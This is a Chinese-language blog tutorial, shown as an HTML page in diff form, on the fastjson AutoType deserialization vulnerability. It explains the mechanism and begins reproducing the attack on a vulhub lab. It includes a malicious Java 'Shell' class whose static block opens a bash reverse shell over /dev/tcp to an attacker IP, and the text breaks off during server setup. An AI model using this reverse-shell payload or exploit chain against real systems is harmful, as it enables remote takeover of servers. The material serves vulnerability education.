@@ -1,0 +1,593 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>fastjson反序列化漏洞 | 云麒火翎_落辰星</title><meta name="author" content="云麒火翎_落辰星"><meta name="copyright" content="云麒火翎_落辰星"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="fastjson反序列化漏洞原理以及复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化漏洞">
+<meta property="og:url" content="https://xiaoyu-lane.github.io/stcs/2023/07/e08e901851f2/index.html">
+<meta property="og:site_name" content="云麒火翎_落辰星">
+<meta property="og:description" content="fastjson反序列化漏洞原理以及复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiaoyu-lane.github.io/images/avatar.jpg">
+<meta property="article:published_time" content="2023-07-09T02:21:02.000Z">
+<meta property="article:modified_time" content="2025-05-08T18:28:46.628Z">
+<meta property="article:author" content="云麒火翎_落辰星">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="fastjson">
+<meta property="article:tag" content="Java漏洞">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiaoyu-lane.github.io/images/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "fastjson反序列化漏洞",
+  "url": "https://xiaoyu-lane.github.io/stcs/2023/07/e08e901851f2/",
+  "image": "https://xiaoyu-lane.github.io/images/avatar.jpg",
+  "datePublished": "2023-07-09T02:21:02.000Z",
+  "dateModified": "2025-05-08T18:28:46.628Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "云麒火翎_落辰星",
+      "url": "https://xiaoyu-lane-github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="../../../../images/favicon.ico"><link rel="canonical" href="https://xiaoyu-lane.github.io/stcs/2023/07/e08e901851f2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="我看看是你人是机"/><link rel="stylesheet" href="../../../../css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+  google_ad_client: 'ca-pub-5439882342455048',
+  enable_page_level_ads: 'true'
+});</script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?54c202b4df05fc77ab369bddadca9ede";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-WSRR4RC828"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-WSRR4RC828')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-WSRR4RC828', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":300,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 云麒火翎_落辰星","link":"链接: ","source":"来源: 云麒火翎_落辰星","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-center"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'fastjson反序列化漏洞',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="baidu-site-verification" content="codeva-g3kXWrDOj8" /><meta name="google-site-verification" content="yjAR9unYae0suthpZ1lcjswMecM_aHVVfmUvvCByUoM" /><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="atom.xml" title="云麒火翎_落辰星" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/index.html"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 分类</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/stcs/"><i class="fa-fw fas fa-shield-halved"></i><span> 渗透</span></a></li><li><a class="site-page child" href="/categories/prog/"><i class="fa-fw fas fa-computer"></i><span> 开发</span></a></li><li><a class="site-page child" href="/categories/products/"><i class="fa-fw fas fa-cloud"></i><span> 自研产品</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="../../../../index.html"><span class="site-name">云麒火翎_落辰星</span></a><a class="nav-page-title" href="../../../../index.html"><span class="site-name">fastjson反序列化漏洞</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/index.html"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><span class="site-page group hide"><i class="fa-fw fas fa-list"></i><span> 分类</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/stcs/"><i class="fa-fw fas fa-shield-halved"></i><span> 渗透</span></a></li><li><a class="site-page child" href="/categories/prog/"><i class="fa-fw fas fa-computer"></i><span> 开发</span></a></li><li><a class="site-page child" href="/categories/products/"><i class="fa-fw fas fa-cloud"></i><span> 自研产品</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">fastjson反序列化漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-09T02:21:02.000Z" title="发表于 2023-07-09 10:21:02">2023-07-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-08T18:28:46.628Z" title="更新于 2025-05-09 02:28:46">2025-05-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="../../../../categories/stcs/">stcs</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是fastjson"><a href="#什么是fastjson" class="headerlink" title="什么是fastjson"></a>什么是fastjson</h2><mark class="hl-label blue">fastjson</mark>是一个由阿里开发的开源Java类库，可以将Java对象转换为JSON格式；当然，它也可以将JSON字符串转换为Java对象。fastjson可以操作任何Java对象，即使是一些预先存在的没有源码的对象，fastjson也可以进行操作。所以它的使用是很广泛的。
+
+<h2 id="什么是序列化和反序列化"><a href="#什么是序列化和反序列化" class="headerlink" title="什么是序列化和反序列化"></a>什么是序列化和反序列化</h2><p>序列化就是将一个对象转换成JSON字符串的过程，而反序列化就是将JSON字符串转换成对象的过程。</p>
+<h1 id="AutoType"><a href="#AutoType" class="headerlink" title="AutoType"></a>AutoType</h1><p>在进行漏洞复现之前，先来了解一下fastjson的<mark class="hl-label blue">AutoType</mark>的机制</p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>fastjson引入了<mark class="hl-label blue">@AutoType</mark>的注解，fastjson在读取json字符串并进行反序列化操作时，会读取到json字符串中的<mark class="hl-label blue">@type</mark>的内容，将json字符串的内容反序列化为Java对象并调用这个对象所属类的setter方法。</p>
+<blockquote>
+<p>当然，漏洞产生的原因也是因为这个AutoType的功能。</p>
+</blockquote>
+<h2 id="使用原因"><a href="#使用原因" class="headerlink" title="使用原因"></a>使用原因</h2><p>既然上文都说了漏洞产生的原因也是在这个AutoType的功能上产生的，那为什么还要使用呢？</p>
+<p>其实fastjson在进行转换的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。对于JSON框架来说，想要把一个Java对象转换成字符串。可以使用下面两种方法进行转换：</p>
+<ol>
+<li>基于<code>getter</code>和<code>setter</code></li>
+<li>AutoType</li>
+</ol>
+<h3 id="基于getter和setter"><a href="#基于getter和setter" class="headerlink" title="基于getter和setter"></a>基于<code>getter</code>和<code>setter</code></h3><p>基于<code>getter</code>和<code>setter</code>来进行序列化和反序列化操作时，当转换后得到对象的类只有一个接口的时候，将这个类的对象进行反序列化操作的时候，就会将子类抹去，只保留接口的类型，最后导致反序列化时无法得到原始类型。示例代码如下：</p>
+<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">store.java</button><button type="button" class="tab">main.java</button></div><div class="tab-contents"><div class="tab-item-content active"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Store</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Phone phone;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Phone <span class="title function_">getPhone</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPhone</span><span class="params">(Phone phone)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.phone = phone;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Store&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, phone=&quot;</span> + phone +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 手机的接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">implements</span> <span class="title class_">Phone</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> BigDecimal price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> BigDecimal <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(BigDecimal price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Apple&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;price=&quot;</span> + price +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        商店类</span></span><br><span class="line">        <span class="type">Store</span> <span class="variable">store</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Store</span>();</span><br><span class="line">        store.setName(<span class="string">&quot;落星辰&quot;</span>);</span><br><span class="line"><span class="comment">//        苹果手机价格</span></span><br><span class="line">        <span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Apple</span>();</span><br><span class="line">        apple.setPrice(<span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="number">12000</span>));</span><br><span class="line"><span class="comment">//        将苹果手机放入商店</span></span><br><span class="line">        store.setPhone(apple);</span><br><span class="line"><span class="comment">//        序列化操作</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(store);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----现在执行序列化操作-----&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化：&quot;</span> + s);</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------------\n\n\n&quot;</span>);</span><br><span class="line"><span class="comment">//        反序列化操作</span></span><br><span class="line">        <span class="type">Store</span> <span class="variable">ns</span> <span class="operator">=</span> JSON.parseObject(s, Store.class);</span><br><span class="line">        System.out.println(<span class="string">&quot;-----现在执行反序列化操作-----&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化：&quot;</span> + ns);</span><br><span class="line">        <span class="type">Apple</span> <span class="variable">a</span> <span class="operator">=</span> (Apple) ns.getPhone();</span><br><span class="line">        System.out.println(<span class="string">&quot;获取苹果手机： &quot;</span> + a);</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------------&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>
+
+<p>代码执行结果如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230709162454451.png" alt="image-20230709162454451"></p>
+<p>通过运行结果我们可以得出：在进行反序列化操作后，我们尝试将Phone类型转换为Apple类型，但是抛出了异常，而转换成Phone却不会抛出异常：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Phone</span> <span class="variable">a</span> <span class="operator">=</span> (Phone) ns.getPhone();</span><br><span class="line">System.out.println(<span class="string">&quot;获取苹果手机： &quot;</span> + a);</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230709163301530.png" alt="image-20230709163301530"></p>
+<h3 id="使用AutoType"><a href="#使用AutoType" class="headerlink" title="使用AutoType"></a>使用AutoType</h3><p>为了解决上面的问题，fastjson引入了AdutoType的功能，它会在序列化的时候，把原始类型记录下来。</p>
+<p>我们只需要将上面代码中序列化的操作加上参数<code>SerializerFeature.WriteClassName</code>，它会把原始类型标记下来。下面是修改代码前后比对：</p>
+<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">修改前</button><button type="button" class="tab">修改后</button></div><div class="tab-contents"><div class="tab-item-content active"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(store);</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> JSON.toJSONString(store, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>
+
+<p>修改之后的运行结果如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230709164210557.png" alt="image-20230709164210557"></p>
+<p>我们可以看到，输出序列化的JSON字符串的时候，多了一个<code>@type</code>的字段，标记了类对应的原始类型，这样方便了在反序列化的时候定位到具体类型。</p>
+<blockquote>
+<p>这就是AutoType的功能，以及fastjson中使用AutoType的原因。</p>
+</blockquote>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取<code>@type</code>到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。</p>
+<p>因为AutoType在设计之初时，安全方面考虑不周全，我们就可以利用这个特性，去构造一个JSON字符串，并使用<code>@type</code>指定一个自己想要攻击的类库。</p>
+<p>最常见的就有sun官方提供过的一个<code>com.sun.rowset.JdbcRowSetImpl</code>这个类，这个类中有个dataSourceName方法支持传入一个<a href="!--swig%EF%BF%BC22--">rmi</a>的源，只要解析其中的url就会支持远程调用。</p>
+<p>那么整个漏洞的利用过程就是：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230713194942849.png" alt="image-20230713194942849"></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><blockquote>
+<p>trip: 如何判断是否使用的组件是fastjson可以参考文章：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_18980147/article/details/126653516">https://blog.csdn.net/qq_18980147/article/details/126653516</a></p>
+</blockquote>
+<h2 id="1-2-24版本"><a href="#1-2-24版本" class="headerlink" title="1.2.24版本"></a>1.2.24版本</h2><h3 id="开启靶机"><a href="#开启靶机" class="headerlink" title="开启靶机"></a>开启靶机</h3><p>靶场使用vulhub搭建，进入fastjson漏洞的目录</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230709183614815.png" alt="image-20230709183614815"></p>
+<p>执行命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>执行成功后输入下面命令查看靶机是否启动</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p>如果看到下图信息即开启成功</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230709183811800.png" alt="image-20230709183811800"></p>
+<p>启动成功后访问<code>http://你靶机的ip:8090</code>即可访问靶机页面</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/images/loading.gif" data-original="image-20230709184308892.png" alt="image-20230709184308892"></p>
+<h3 id="搭建执行恶意命令的服务器"><a href="#搭建执行恶意命令的服务器" class="headerlink" title="搭建执行恶意命令的服务器"></a>搭建执行恶意命令的服务器</h3><blockquote>
+<p>在搭建服务器前，得先搭建Java,maven和rmi服务的环境。搭建文章如下：</p>
+<p>搭建Java环境：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_45009837/article/details/126055165">https://blog.csdn.net/qq_45009837/article/details/126055165</a></p>
+<p>搭建maven环境：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/qq_45867375/article/details/124730372">https://blog.csdn.net/qq_45867375/article/details/124730372</a></p>
+<p>搭建rmi服务：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/m0_54899775/article/details/122485232">https://blog.csdn.net/m0_54899775/article/details/122485232</a></p>
+</blockquote>
+<p>搭建步骤如下：</p>
+<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">step1</button><button type="button" class="tab">step2</button><button type="button" class="tab">step3</button><button type="button" class="tab">step4</button></div><div class="tab-contents"><div class="tab-item-content active"><p>编写一个恶意类，代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//            获取runtime对象</span></span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.74.130/7178 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(commands);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编写完成后，使用javac进行编译：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac Shell.java</span><br></pre></td></tr></table></figure>
+
+<p>编译完成后，目录内容是这样的：</p>
